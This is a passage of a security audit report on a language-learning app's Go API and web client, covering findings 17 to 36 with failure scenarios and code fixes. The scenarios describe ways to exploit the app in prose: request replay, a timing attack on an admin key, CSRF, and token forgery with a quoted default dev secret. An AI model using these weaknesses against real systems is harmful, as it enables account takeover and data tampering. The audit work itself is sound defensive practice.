**Failure scenario:** A learner (or a client retry / double-tap / replay) POSTs /v1/sessions/{id}/complete twice for the same session. Each call adds session.TotalXP to learner_streaks.total_xp and increments total_sessions again. XP, level (LevelFromXP), leaderboard rank, and teacher/dean 'total sessions' metrics all inflate arbitrarily by repeating the request. Two concurrent completes race the same way.

**Fix:** Make completion idempotent by gating the streak/level side effects on an actual status transition. In store/session_item.go CompleteSession, add the status filter and return whether a row transitioned: change the query to `UPDATE sessions SET status='completed', completed_at=NOW(), total_xp=$2, accuracy_rate=$3, duration=$4 WHERE id=$1 AND status <> 'completed'` and return the tag's RowsAffected (change signature to `(int64, error)` via `res, err := s.db.Exec(...); return res.RowsAffected(), err`). In handler/session.go Complete(), only run RecordActivity/UpdateLevel when RowsAffected == 1 (i.e., the session actually transitioned to completed this call); if 0, treat it as an already-completed no-op and just return the existing summary. Ideally wrap the sessions UPDATE and the streak RecordActivity in a single DB transaction so the increment and the status flip commit atomically, closing the concurrent-complete race.

### 17. [MEDIUM] Concurrent result submissions on one session lose XP/index via read-modify-write with no locking
`services/api/internal/handler/session.go:329` — _sql-data / race condition / TOCTOU_

**What:** SubmitResult re-fetches the session (GetByID at line 329), computes newIndex = CurrentIndex+1, newTotalXP = TotalXP + xpEarned and newAccuracy in Go, then writes them back with UpdateSessionState (store/session_item.go:105 -> UPDATE sessions SET current_index=$2, total_xp=$3, accuracy_rate=$4 WHERE id=$1). There is no SELECT ... FOR UPDATE and no transaction spanning read+write, so two overlapping requests both read the same baseline and the second write clobbers the first.

**Failure scenario:** Two /v1/sessions/{id}/result requests for the same session arrive nearly simultaneously (fast learner, retried request, or two tabs). Both read total_xp=100, current_index=5; each writes 100+xp and index 6, so one exercise's XP and the index increment are silently dropped, and accuracy_rate is computed off a stale CurrentIndex. Session counters diverge from the actual exercise_results rows.

**Fix:** Make the counter update atomic in SQL instead of read-modify-write. Replace UpdateSessionState's body (store/session_item.go:105) — or add a new increment method — with `UPDATE sessions SET current_index = current_index + 1, total_xp = total_xp + $2 WHERE id = $1 RETURNING current_index, total_xp`, and have the handler pass only the xp delta. Because accuracy_rate cannot be reconstructed atomically from the row alone (it needs a running correct-count), either add a `correct_count` column and increment it in the same UPDATE (accuracy_rate = correct_count::float / current_index), or recompute accuracy_rate from a `SELECT count(*) FILTER (WHERE is_correct) , count(*) FROM exercise_results WHERE session_id=$1` in the same transaction. Alternatively, wrap the GetByID + UpdateSessionState in a transaction using SELECT ... FOR UPDATE to serialize concurrent submits.

### 18. [MEDIUM] Account lockout and rate limiting fail open on Redis errors
`services/api/internal/redisstore/lockout.go:42` — _auth-crypto / abuse-control_

**What:** redisstore.Lockout.RecordFailedAttempt returns 401 (treat as a normal failed attempt, no lockout) whenever rdb.Incr errors (lockout.go:42-44), and CheckLockout returns 0 (not locked) on any Exists error (lockout.go:27). Likewise redisstore.RateLimiter.RateLimit calls next.ServeHTTP on any Incr error (ratelimit.go:44-46). All brute-force and rate-limit protection is disabled the moment Redis is unavailable or errors.

**Failure scenario:** An attacker who can induce Redis pressure/unavailability (or simply waits for a Redis blip / failover) gets unlimited password-guessing attempts against /v1/auth/token and unlimited request volume against every authenticated endpoint — no lockout is ever recorded and no 429 is ever returned. Because the counters also live only in Redis, a Redis flush likewise resets all in-progress lockouts.

**Fix:** Fail closed / degrade safely on Redis error for the security-critical counters instead of failing open. In redisstore/lockout.go: (1) RecordFailedAttempt should, on Incr/Exists error, return 429 (or fall back to a small in-process per-user attempt counter that locks after a low threshold) rather than 401; (2) CheckLockout should treat an Exists error conservatively (log + return 429 or consult the in-process fallback) rather than returning 0. In redisstore/ratelimit.go:44-46, replace the unconditional next.ServeHTTP on Incr error with a strict in-process fallback limiter (e.g. golang.org/x/time/rate or a small per-user token bucket) so requests are still bounded when Redis is down, and log/alert on the degraded state. Wire a metric/alert so operators are notified when the security counters are running in fallback mode. Keeping an in-process backstop is essential because these managers are the sole active implementation once Redis is configured; a transient Redis error must not remove all brute-force and rate-limit protection.

### 19. [MEDIUM] Client-supplied analytics 'meta' JSON stored verbatim with no key allowlist or sanitization
`services/api/internal/store/analytics.go:60` — _privacy-coppa / pii-analytics_

**What:** The ingest path stores `e.Meta json.RawMessage` directly into the JSONB `meta` column via COPY (InsertBatch, analytics.go:48-51,60). The handler validates event_type, truncates route/element, and clamps x/y, but performs NO validation or key-allowlisting on `meta`. The client `analytics.task(name, phase, meta)` spreads caller-supplied `meta` (analytics.ts:174-176), and any client can POST arbitrary JSON up to the 256KB body cap. This directly contradicts the migration's 'No free text ... or PII is stored' claim: a malicious or careless client can stuff free-text, emails, answer content, or other PII into meta, and it is persisted indefinitely against the user_id.

**Failure scenario:** A client (or a future feature) calls analytics.task('lesson', 'complete', { answer: 'user typed free text', email: '...' }); the server accepts it because meta is unvalidated, and InsertBatch writes the free text/PII into analytics_events.meta. The 'no PII' invariant the whole privacy design depends on is broken by any client-supplied meta.

**Fix:** In handler/analytics.go, before appending to `clean`, replace the client-supplied meta with a server-built allowlisted object: unmarshal e.Meta into map[string]json.RawMessage, keep only a fixed set of keys (e.g. task, lessonId, from), drop everything else, re-marshal, and reject/clear if the serialized result exceeds a few hundred bytes. For example add after the clampFrac calls: `e.Meta = sanitizeMeta(e.Meta)` where sanitizeMeta parses the JSON object, copies only allowlisted keys whose values are short scalars, caps total length (e.g. 512 bytes), and returns nil on any parse/oversize failure. This keeps the task-funnel aggregation working while enforcing the migration's 'no free text / PII' guarantee server-side instead of trusting the client.

### 20. [MEDIUM] Curriculum PutProgress unconditionally overwrites the server blob — empty/stale client can clobber real progress
`services/api/internal/store/curriculum.go:37` — _structure-config / structural/consistency_

**What:** PutProgress (handler/curriculum.go:57) validates only that the body is well-formed JSON, then Upsert (store/curriculum.go:37) does `ON CONFLICT (user_id) DO UPDATE SET data = EXCLUDED.data` — a blind last-write-wins overwrite with no merge, no version/updated_at compare, and no minimum-content check. The ONLY thing preventing a fresh device (empty localStorage) from pushing `{lessons:{},exams:{},topics:{}}` and wiping months of mastery is the client-side `synced` gate in CurriculumPath.tsx (lines 86, 124, 137) plus the `masteredCount(merged) >= masteredCount(local)` adopt-check (line 114). Any client that skips that gate — a mobile client, a direct API call, a race where the pull errors out and `.finally(setSynced(true))` still fires (lines 121-124) so the debounced empty push at line 143 runs — permanently overwrites the server blob. Unlike the level projection (which is monotonic), the blob itself has no server-side floor.

**Failure scenario:** Learner opens the app on a new device offline; getCurriculumProgress() rejects, the .catch runs, .finally sets synced=true, and the 1500ms debounced push in the effect at line 139 sends the empty local ProgressMap. Upsert overwrites the server row; the learner's real cross-device progress is destroyed on next pull from any device.

**Fix:** Add a server-side floor so a less-complete blob cannot overwrite a more-complete stored one. Minimal fix in store/curriculum.go Upsert: read the existing row in the same transaction (or use a conditional SQL update) and reject/skip the write when the incoming blob has fewer mastered lessons than the stored one. Concretely, change the CONFLICT clause to only overwrite when the new blob is not a regression, e.g. compute an incoming mastered-lesson count server-side and guard: `ON CONFLICT (user_id) DO UPDATE SET data = EXCLUDED.data, updated_at = now() WHERE (SELECT count(*) FROM jsonb_each(EXCLUDED.data->'lessons') e WHERE (e.value->>'mastered')::bool) >= (SELECT count(*) FROM jsonb_each(curriculum_progress.data->'lessons') e WHERE (e.value->>'mastered')::bool)`. Alternatively/additionally have PutProgress reject a body whose lessons object is empty when a non-empty row already exists (cheap early guard covering the exact empty-clobber scenario). Belt-and-suspenders: also fix the client so the debounced push does not fire when the pull failed (only set synced=true in the .then success path, not .finally), so an errored pull leaves synced=false and no empty push is sent — but the authoritative fix must be server-side since a mobile/direct API client bypasses the client gate entirely.

### 21. [MEDIUM] StreakStore.Get swallows all DB errors as zeroed stats, which regresses stored level on a transient failure
`services/api/internal/store/streak.go:41` — _sql-data / NULL/error handling / data integrity_

**What:** Get() returns &LearnerStats{CurrentLevel:1} for ANY error from QueryRow, not just pgx.ErrNoRows (the comment says 'not found' but the code catches every error). In session Complete() (handler/session.go:387-390) the result is fed to LevelFromXP(streakStats.TotalXP) and then streaks.UpdateLevel(learnerID, newLevel).

**Failure scenario:** During Complete(), RecordActivity commits the XP, then Get() hits a transient error (pool exhaustion, context deadline, connection reset). Get() returns TotalXP=0, so LevelFromXP(0)=1 and UpdateLevel writes current_level=1 into learner_streaks, regressing a high-level learner to level 1. The same swallow also masks real read failures elsewhere that rely on Get.

**Fix:** In Get(), distinguish not-found from real errors:

```go
import "errors"
import "github.com/jackc/pgx/v5"
...
err := s.db.QueryRow(...).Scan(...)
if errors.Is(err, pgx.ErrNoRows) {
    return &LearnerStats{LearnerID: learnerID, CurrentLevel: 1}, nil // new learner
}
if err != nil {
    return nil, err // propagate transient/real errors
}
```

And in handler/session.go Complete(), stop ignoring the error and skip the level update on failure:

```go
streakStats, err := h.streaks.Get(ctx, session.LearnerID)
if err == nil && streakStats != nil {
    newLevel := engine.LevelFromXP(streakStats.TotalXP)
    _ = h.streaks.UpdateLevel(ctx, session.LearnerID, newLevel)
}
```

This ensures a transient read failure leaves the stored current_level untouched rather than resetting it to 1. (The later `if streakStats != nil { summary.StreakDays = ... }` block already nil-guards, so it remains safe when Get returns nil.)

### 22. [LOW] COPPA parental-consent record (with parent email PII) is stored only in localStorage
`apps/web/src/app/(auth)/signup/page.tsx:103` — _web-client / privacy/compliance_

**What:** For the 'kid' segment, the parental-consent record is written only to the browser: localStorage.setItem('kid_consent', JSON.stringify({ at, by: email })). It contains the consenting adult's email (PII), is trivially clearable/forgeable by the user, and is never sent to the server. The code comment (signup/page.tsx:99-101) itself acknowledges genuine COPPA needs a verifiable, server-side, deletable record.

**Failure scenario:** A minor (or anyone) clears/edits localStorage and the only evidence of parental consent for a child account disappears or is fabricated; separately, the parent's email sits in JS-readable storage where XSS or a shared/kiosk browser exposes it. There is no server-side proof of consent for compliance/audit.

**Fix:** Persist the consent event server-side at registration: extend the register/createProfile API (services/api handler + store) to accept and store a consent record (child account id, consenting identity, ISO timestamp, and an audit trail supporting deletion). In signup/page.tsx, send that consent flag as part of the register/createProfile call instead of writing to localStorage, and stop storing the parent email client-side — keep at most a non-PII boolean acknowledgment flag on the client. Provide a server-side deletion path for the stored consent record to meet COPPA data-deletion requirements.

### 23. [LOW] Placement page bypasses the same-origin cookie proxy and hardcodes a localhost API fallback
`apps/web/src/app/(dashboard)/dashboard/placement/page.tsx:7` — _web-client / robustness/config_

**What:** Unlike lib/api.ts (which defaults API_BASE to the same-origin '/api' proxy so httpOnly cookies flow), placement/page.tsx uses `const API = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:8080'` and calls the API directly with a localStorage Bearer token (lines 99-114, 227). If NEXT_PUBLIC_API_URL is unset in production, the user's browser calls http://localhost:8080 (fails / mixed-content on an HTTPS page), breaking placement entirely; and even when set, it forces the localStorage-token path instead of cookie auth, reinforcing the token-in-localStorage exposure.

**Failure scenario:** Web app deployed to HTTPS with NEXT_PUBLIC_API_URL unset (relying on the /api proxy like the rest of the app): every placement request goes to http://localhost:8080 from the visitor's browser and fails, so no learner can take the adaptive placement test; where it is set, an attacker who obtains the localStorage token (see finding 1) can replay it against the placement API.

**Fix:** Route both placement calls through the shared api client / same-origin `/api` proxy instead of a direct localhost fetch with a localStorage Bearer token. Either add `generatePlacement()`/`submitPlacement()` methods to ApiClient in apps/web/src/lib/api.ts (which already uses API_BASE=`/api` and `credentials:"include"`), or at minimum change page.tsx:7 to `const API = process.env.NEXT_PUBLIC_API_URL || "/api"` and add `credentials:"include"` to the two fetch calls (lines 107 and 237), so requests flow through the proxy with httpOnly cookie auth and there is no hardcoded localhost fallback that breaks on HTTPS.

### 24. [LOW] Devserver ships insecure shortcuts (hardcoded HS256 secret, bcrypt.MinCost, no ownership/rate-limit) that must never be built for production
`services/api/cmd/devserver/main.go:24` — _api-robustness / hardening_

**What:** cmd/devserver hardcodes `jwtSecret = "dev-secret-change-in-production"` and signs tokens with HS256 (line 387), hashes passwords with bcrypt.MinCost (line 519), enforces no CORS origin allowlist beyond localhost wildcards, applies no rate limiting or body-size cap, and its protected handlers (profiles/{id}, sessions/*) perform NO ownership checks (e.g. GET /profiles/{id} returns any profile by UUID, line 667). There is nothing (build tag, ENVIRONMENT guard, or main-package comment enforced in CI) preventing this binary from being built and deployed by mistake, unlike cmd/server which has config.Load() production fail-fast guards.

**Failure scenario:** An operator accidentally builds/deploys cmd/devserver instead of cmd/server (both are `package main`); the service then accepts tokens forged with the publicly-known 'dev-secret-change-in-production' key, granting anyone full authenticated access and cross-user profile reads.

**Fix:** Add a build constraint so the dev binary cannot be produced by a normal build/deploy. Put `//go:build dev` (with the required blank line after) at the top of cmd/devserver/main.go and any other files in that package, so `go build ./...` and `go build ./cmd/server` never compile it. As an additional in-code safety net, at the start of devserver main() refuse to start unless os.Getenv("ENVIRONMENT") == "development" (log.Fatal otherwise). Optionally add a CI check that fails if `go build ./...` (without the dev tag) is missing, ensuring devserver stays excluded. These changes make the insecure-shortcut binary unbuildable in a standard pipeline, closing the operator-mistake path without touching cmd/server.

### 25. [LOW] ValidateToken does not enforce token type (access vs refresh) or issuer/audience
`services/api/internal/auth/auth.go:162` — _auth-crypto / authentication_

**What:** ValidateToken and the JWTAuth middleware validate only signature+expiry+algorithm; they never check the 'typ' claim, nor an issuer (iss) or audience (aud). Access tokens set Type:"access" (auth.go:139) but nothing rejects a refresh token presented as a bearer access token, and vice-versa. All tokens are signed with the same key, so any signed JWT with a Subject is accepted as an access token by JWTAuth (middleware/auth.go:49-68).

**Failure scenario:** A refresh token (30-day TTL) presented in the Authorization: Bearer header is accepted by JWTAuth as a valid access token because it is signed and unexpired and has a Subject — effectively giving the long-lived refresh token the access-token's authority for 30 days instead of 15 minutes. It also means tokens minted for one purpose/audience are interchangeable.

**Fix:** Bind tokens to a purpose and validate it. (1) Add Type:"refresh" in GenerateRefreshToken by minting a TokenClaims (not bare RegisteredClaims). (2) In JWTAuth (middleware/auth.go), after a successful parse reject unless claims.Type == "access" (return 401 invalid_token_type). (3) In the refresh path (handler/auth.go Refresh / auth.RotateRefreshToken), require claims.Type == "refresh". (4) Defense-in-depth: set a fixed Issuer/Audience on all tokens at mint time and pass jwt.WithIssuer(...) / jwt.WithAudience(...) to jwt.ParseWithClaims in both ValidateToken and JWTAuth so tokens are not cross-usable across purposes or environments.

### 26. [LOW] Insecure production defaults only WARN instead of failing fast (default JWT_SECRET, sslmode=disable DB URL)
`services/api/internal/config/config.go:62` — _structure-config / config_

**What:** config.Load() fails fast only on a missing JWTKeyPath in non-dev (line 66-68). But a missing JWT_SECRET in prod merely logs a WARNING (line 63-65) and continues with the public constant `dev-secret-change-in-production`; JWT_SECRET is still consumed elsewhere (e.g. any HS256 path / mobile fallback) so shipping the default is silently allowed. Separately, the default DATABASE_URL (line 43) is `postgres://russkiy:russkiy@localhost:5432/russkiy?sslmode=disable` — if DATABASE_URL is unset in prod the service connects with TLS disabled and default credentials rather than refusing to start. Neither is gated by the `env != development` block.

**Failure scenario:** A prod deploy sets JWT_PRIVATE_KEY_PATH (so startup passes) but forgets JWT_SECRET or DATABASE_URL. The server boots with a publicly-known JWT secret and/or an unencrypted DB connection to localhost with default creds, instead of crashing and surfacing the misconfiguration.

**Fix:** In the `env != "development"` branch of config.Load(): (1) Optionally remove the unused JWTSecret field/default entirely since it is never consumed (dead config), or if kept, log.Fatal on the default only for consistency — it has no runtime security effect. (2) For the real gap: require DATABASE_URL to be explicitly set in non-dev (fail if os.Getenv("DATABASE_URL") == "") and reject `sslmode=disable`/`sslmode=allow`/`sslmode=prefer` in the URL, e.g. `if strings.Contains(cfg.DatabaseURL, "sslmode=disable") { log.Fatal("FATAL: DATABASE_URL must not disable TLS in production") }`. This makes a misconfigured prod deploy crash and surface the issue rather than silently attempting an unencrypted default-credential localhost connection.

### 27. [LOW] Admin API key compared with non-constant-time == (timing side channel)
`services/api/internal/handler/admin.go:23` — _auth-crypto / crypto_

**What:** authorized() compares the presented X-Admin-Key using Go's == operator (admin.go:23), which short-circuits on the first differing byte and is not constant-time. The same pattern exists in institution.go:38. This key gates role escalation (SetRole can grant 'admin'/'dean') and institution/tenant creation, and there is no IP allowlist on these routes in main.go despite task notes suggesting one — they are registered as plain public routes (main.go:182-185).

**Failure scenario:** An attacker with precise timing measurement against /v1/admin/users/role could, in principle, incrementally recover the admin key byte-by-byte via the string-comparison timing differential; success yields full role escalation (grant themselves admin/dean) and tenant creation. The absence of any network/IP restriction on these endpoints removes the mitigating control.

**Fix:** Replace the `==` comparison in both authorized() (admin.go:23) and authorizedAdmin() (institution.go:38) with a constant-time compare over fixed-length hashes so length isn't leaked and comparison time is input-independent. E.g.:

import ("crypto/sha256"; "crypto/subtle")

func (h *AdminHandler) authorized(r *http.Request) bool {
    if h.apiKey == "" { return false }
    presented := sha256.Sum256([]byte(r.Header.Get("X-Admin-Key")))
    configured := sha256.Sum256([]byte(h.apiKey))
    return subtle.ConstantTimeCompare(presented[:], configured[:]) == 1
}

Apply the same pattern to InstitutionHandler.authorizedAdmin (institution.go:38). Optionally, as defense-in-depth, restrict /v1/admin/* to an internal network / IP allowlist / mTLS since they are pure shared-secret routes, and enforce a minimum ADMIN_API_KEY length at config load. The constant-time compare is the required change; the network restriction is a recommended hardening.

### 28. [LOW] Admin-key checks use non-constant-time string comparison
`services/api/internal/handler/admin.go:23` — _tenant-authz / auth-weakness_

**What:** AdminHandler.authorized (admin.go:23) and InstitutionHandler.authorizedAdmin (institution.go:38) gate the role-granting and tenant-provisioning endpoints (POST /v1/admin/users/role, /v1/admin/institutions, /v1/admin/institutions/{id}/members — all public routes, main.go:182-185) with a plain `r.Header.Get("X-Admin-Key") == h.apiKey`. Go's == on strings is not constant-time and can short-circuit on the first differing byte, leaking a timing side-channel on the shared secret. These endpoints can create tenants and set any user's role (including admin/dean), so the key is high-value.

**Failure scenario:** A network-positioned or remote attacker who can measure response latency submits many guesses to /v1/admin/users/role, using timing differences to recover the ADMIN_API_KEY byte-by-byte, then grants themselves the admin role and full analytics/tenant control. Exploitation is difficult over the internet but the weakness is real and the blast radius (role escalation, tenant creation) is severe.

**Fix:** In both handler/admin.go authorized() and handler/institution.go authorizedAdmin(), replace the `==` comparison with a constant-time compare, keeping the empty-key guard. Add `import "crypto/subtle"` and use: `if h.apiKey == "" { return false }; return subtle.ConstantTimeCompare([]byte(r.Header.Get("X-Admin-Key")), []byte(h.apiKey)) == 1` (and the same with h.adminKey in institution.go). Note ConstantTimeCompare returns 0 for differing lengths (which itself is a length-only leak, acceptable here). Optionally hash both sides with SHA-256 before comparing to also hide length.

### 29. [LOW] Refresh cookie is scoped to Path=/ (sent on every request) despite comment claiming path-scoping
`services/api/internal/handler/authcookies.go:33` — _auth-crypto / session-management_

**What:** The header comment states the long-lived refresh cookie 'is path-scoped to the auth endpoints so it isn't sent on every request' (authcookies.go:14-15), but setAuthCookies sets the refresh_token cookie with Path: "/" (authcookies.go:34). The high-value 30-day refresh token is therefore transmitted on every request to the origin (including all API calls, static assets via the proxy, etc.), enlarging its exposure surface (logs, proxies, any request-capturing bug).

**Failure scenario:** Because the refresh cookie rides along with every same-origin request, any request-logging middleware, misconfigured proxy, or a response/mixed-content downgrade increases the chance of the long-lived refresh token leaking, compared to scoping it to just /v1/auth/refresh + /v1/auth/logout. It also means the token is exposed to more handlers than necessary.

**Fix:** In setAuthCookies (authcookies.go:33-37) change the refresh cookie to Path:"/v1/auth" so it is only sent to /v1/auth/refresh and /v1/auth/logout (bare "/auth" would not match the /v1-mounted routes and would break refresh). Update clearAuthCookies (line 42) so the refresh entry uses the same "/v1/auth" path — otherwise the deletion cookie (different path) will not overwrite the original and logout will fail to clear it. Leave the access_token cookie at Path:"/" since it is needed on all protected routes. Alternatively, if the broad path is intentional, correct the misleading comment at lines 14-15 instead.

### 30. [LOW] Per-user curriculum blob vs per-profile server state: multi-profile users smear progress and level onto the wrong profile
`services/api/internal/handler/curriculum.go:82` — _structure-config / structural/consistency_

**What:** curriculum_progress is keyed by user_id (one blob per user), but a user can own multiple learner_profiles (ProfileHandler.Create, ListByUserID returns a slice; profiles[0] is used as 'primary' in stats.go:40, skills.go:55, session.go:432, and AdvanceLevelByUserID:100 all pick `ORDER BY created_at LIMIT 1`). The client, however, keys localStorage progress by learnerId = the ACTIVE profile id (auth.getLearnerId(), progress.ts:45 `curriculum_v2_${learnerId}`). So if a user switches to a second profile, its client progress is a different localStorage bucket, but syncing it pushes to the same single per-user server blob — overwriting the first profile's synced progress — and AdvanceLevelByUserID projects that second profile's level onto the FIRST (earliest) profile's current_level. The blob, the projected level, and the profile they attach to can all reference different profiles.

**Failure scenario:** A user with two profiles (e.g. a parent testing plus their own learning) advances profile B; the sync overwrites the server blob that belonged to profile A, and profile A's current_level row is bumped to B's level. On another device, profile A pulls B's progress. Data from distinct learners is smeared together.

**Fix:** Prefer keying curriculum_progress by learner/profile id (matching the client's per-learnerId localStorage bucket) and projecting the derived level onto the matching profile row rather than the earliest one: add a profile_id column (or use it as the PK) to the curriculum_progress table and to CurriculumStore.Get/Upsert, have the client send the active learnerId (or derive it server-side from a validated, user-owned profile id), and change AdvanceLevelByUserID to UpdateLevel(profileID) scoped to the profile that owns the blob (still monotonic via the `$2::cefr_level > current_level` guard, after verifying profile.user_id == authenticated user). Alternatively, if multi-profile is not an intended product feature, enforce a single profile per user (unique constraint on learner_profiles.user_id + a guard in ProfileHandler.Create returning 409 on a second create) so the per-user blob and earliest-profile projection are always consistent.

### 31. [LOW] LTI Launch echoes raw jwt parse error to the client
`services/api/internal/handler/lti.go:117` — _api-robustness / error-handling_

**What:** On id_token validation failure the handler responds with `"invalid id_token: " + err.Error()`. jwt/v5 error strings can disclose internal validation specifics (signing method, key-id lookup failures, JWKS fetch errors from jwksKey, expiry vs signature distinctions) to an unauthenticated caller, aiding an attacker probing the LTI trust configuration. Every other handler returns a generic error string; this one leaks the library internal.

**Failure scenario:** A platform/attacker POSTs crafted id_tokens to /v1/lti/launch and reads the differentiated error messages ('token is expired' vs 'crypto/rsa: verification error' vs 'no matching JWKS key') to fingerprint the verification path and key setup.

**Fix:** Do not echo the library error to the client. Log it server-side and return a constant message: at lti.go:116-118 replace with `if _, err := jwt.ParseWithClaims(...); err != nil { log.Printf("LTI launch id_token validation failed: %v", err); writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "invalid id_token"}); return }` (import the logging package used elsewhere in the service).

### 32. [LOW] Cookie-authenticated state-changing endpoints have no CSRF defense beyond SameSite=Lax
`services/api/internal/middleware/auth.go:38` — _web-client / csrf_

**What:** JWTAuth accepts the token from the httpOnly `access_token` cookie (auth.go:38-40) for every protected route, including all state-changing POST/PUT endpoints (profile create, session submit, curriculum PUT, teacher cohort/assignment create, institution join/invite/enrol). Nothing in the middleware or handlers checks the Origin/Referer header or requires a CSRF token / custom header. The only cross-site protection is SameSite=Lax on the cookies (authcookies.go:30,35). SameSite=Lax does block the standard cross-site POST CSRF, so this is defense-in-depth rather than an active exploit, but it is a single point of failure: Chrome's 'Lax+POST' 2-minute grace window after a cookie is (re)set, older/less-strict browsers, and any future move to SameSite=None would immediately open real CSRF against these mutating endpoints.

**Failure scenario:** An attacker page auto-submits a top-level POST (or the cookie was just refreshed, opening the Chrome Lax+POST window) to /api/v1/curriculum/progress or /api/v1/teacher/cohorts while the victim is logged in; the browser attaches the Lax access_token cookie and the server processes the mutation as the victim because no Origin check or CSRF token is required.

**Fix:** Add a lightweight server-side CSRF guard applied to the JWTAuth-protected group for state-changing methods (POST/PUT/DELETE). Simplest robust option: in middleware.JWTAuth (or a new middleware wrapping the protected r.Group in cmd/server/main.go:188), when the token came from the cookie (not the Authorization header) and the method is not safe, require the request Origin header to be present and exact-match one of cfg.AllowedOrigins, rejecting with 403 otherwise. Bearer/Authorization-header clients (mobile/LTI) are exempt since they are not cookie-driven and thus not CSRF-able. Optionally also switch the access cookie to SameSite=Strict (authcookies.go:30) if the same-origin Next.js proxy UX allows, eliminating the Chrome Lax+POST grace window.

### 33. [LOW] In-memory RateLimiter never evicts expired windows — unbounded map growth
`services/api/internal/middleware/ratelimit.go:33` — _api-robustness / resource-exhaustion_

**What:** RateLimiter.windows is keyed by userID and an entry is created on first request per user (line 73-80); expired windows are reset in place but never deleted, and there is no background sweeper. The map therefore grows by one *userWindow per distinct authenticated user for the process lifetime. This limiter is wired only on the Redis-unavailable fallback path (cmd/server/main.go:89), so production (Redis present) is unaffected; the leak is real only in the dev/degraded fallback.

**Failure scenario:** In a deployment where Redis is down and the in-memory limiter is active, a large or churning user base (or an attacker cycling accounts) causes the windows map to grow without bound, slowly exhausting memory since entries are never garbage-collected.

**Fix:** In RateLimit(), evict stale entries on access and/or run a periodic pruner. Minimal on-access fix: when now.After(win.windowEnd), delete(rl.windows, userID) before recreating (semantically identical but keeps intent explicit); the more effective fix is a background sweeper started in NewRateLimiter — a goroutine on a ticker (e.g. every WindowDuration) that locks rl.mu and deletes every entry whose windowEnd is before time.Now(). Alternatively, refuse to start with the in-memory limiter outside development (require Redis in production) so the leak path is never active under load.

### 34. [LOW] Re-placement to a LOWER level diverges permanently: client re-locks levels, server current_level cannot regress
`services/api/internal/store/profile.go:97` — _structure-config / consistency_

**What:** The level-check flow lets a learner be re-placed at a LOWER level: LevelCheck.finish() (LevelCheck.tsx:74) writes the new (possibly lower) currentLevel and removes `placement_seeded_*` so CurriculumPath re-seeds and correctly re-locks higher levels client-side. But the server projection AdvanceLevelByUserID (profile.go:97-104) is deliberately monotonic (`AND $2::cefr_level > current_level`), so it refuses to lower current_level. After a downward re-placement the client shows (say) A2 while the server profile stays frozen at B2 — and /v1/stats (stats.go:40, reads profiles[0]) plus the leaderboard and teacher/student reports keep reporting the higher level forever. The two 'current level' systems disagree with no reconciliation path.

**Failure scenario:** A learner who mis-clicked into B2, or a teacher re-testing a student who has regressed, re-runs the level check and lands at A2. The Path/Home now show A2, but the teacher's cohort report and the leaderboard still show B2 because AdvanceLevelByUserID rejected the downward write; the mismatch never resolves.

**Fix:** Make the server level track the authoritative client-derived level instead of being a one-way ratchet. In curriculum.go's PutProgress, when the synced blob carries an explicit placement signal (e.g. add a boolean `placementReset` to the blob set by LevelCheck.finish, or key off placedLevel changing), call a new ProfileStore method SetLevelByUserID that writes current_level exactly (no `> current_level` guard) on the primary profile. Keep AdvanceLevelByUserID monotonic for the ordinary progress-push path to preserve its stale/racing-device protection, but route the placement-reset case through the unconditional setter so a legitimate downward re-placement is honored consistently across stats, leaderboard, and teacher reports. Alternatively, on the server derive the level from the blob's placedLevel/progress and reconcile, but the explicit placement-reset signal is the smaller, lower-risk change.

### 35. [LOW] cohorts.teacher_id foreign key lacks ON DELETE behavior on fresh DBs (migration 001 vs 012 drift)
`services/api/migrations/001_initial_schema.sql:257` — _sql-data / schema drift / FK gap_

**What:** Migration 001 creates cohorts with teacher_id UUID NOT NULL REFERENCES users(id) (no ON DELETE). Migration 012 defines the same table with CREATE TABLE IF NOT EXISTS ... teacher_id ... REFERENCES users(id) ON DELETE CASCADE, but on a fresh DB 001 already created the table so 012's definition is a no-op. The two migrations therefore describe different FK semantics; the effective schema is environment-dependent (fresh 001-first DBs get no cascade; a DB where cohorts was first created by 012 gets cascade).

**Failure scenario:** On a fresh 001-first database, deleting a teacher user that owns cohorts fails with a foreign-key violation (no cascade, no SET NULL), or leaves the operation blocked; a DB provisioned only from 012 would instead cascade-delete the teacher's cohorts. Behavior on teacher deletion is inconsistent across deployments and untested.

**Fix:** Add a new forward migration (e.g. 017) that reconciles the FK regardless of prior state, so all environments converge on one intended behavior. Since deleting a teacher who owns cohorts should not silently destroy student cohort data, prefer restrict/SET NULL over CASCADE unless cascade is genuinely intended. Example:\n\nALTER TABLE cohorts DROP CONSTRAINT IF EXISTS cohorts_teacher_id_fkey;\nALTER TABLE cohorts ADD CONSTRAINT cohorts_teacher_id_fkey\n  FOREIGN KEY (teacher_id) REFERENCES users(id) ON DELETE CASCADE; -- or ON DELETE RESTRICT / SET NULL per product intent\n\nRepeat for assignments.teacher_id (001:273 vs 012:45 has the same drift). Do not rely on CREATE TABLE IF NOT EXISTS to reconcile constraint differences.

### 36. [LOW] No retention limit or right-to-erasure path for analytics_events beyond ON DELETE CASCADE
`services/api/migrations/015_analytics.sql:14` — _privacy-coppa / data-governance_

**What:** analytics_events.user_id has `ON DELETE CASCADE` (migration 015:14), so deleting a user row purges their events — good. But (a) there is no account-deletion / right-to-be-forgotten endpoint anywhere that a learner or parent can invoke (grep shows no delete-user handler), so the CASCADE never fires in practice; and (b) there is no retention window/TTL — behavioral events accumulate indefinitely with no purge job, contrary to data-minimization expectations. The admin dashboards only ever query trailing windows (days<=90), so data older than 90 days is never even used, yet is retained forever.

**Failure scenario:** A user (or, for a kid account, a parent) requests deletion of their data; there is no code path to delete the account, so their analytics/behavioral history and profile persist indefinitely. Separately, years of per-user click/route/session data are retained though only 90 days are ever queried.

**Fix:** Two independent fixes: (1) Add an authenticated self-service account-deletion endpoint (e.g. DELETE /api/me) in the handler layer that deletes the caller's users row via the Postgres store, letting the existing ON DELETE CASCADE purge analytics_events plus profiles/sessions/results; ensure the production pgxstore (not just the in-memory PgStore.DeleteUser) implements the delete and that xAPI/LRS rows keyed by user are also removed. (2) Add a scheduled retention purge for behavioral data, e.g. a periodic `DELETE FROM analytics_events WHERE created_at < now() - interval '90 days'` run from a cron/goroutine ticker, matching the 90-day window the dashboards actually query.

## Remediation plan

### Now / blockers — do before any real users
_These are the highest risk-reduction-per-effort fixes: a handful of small, well-scoped server-side changes that close the entire cross-tenant read/write family and restore the meaning of logout. Each is a few lines mirroring patterns already in the codebase, so effort is low relative to the catastrophic blast radius (any authenticated user corrupting any other user's data; logout providing zero security)._

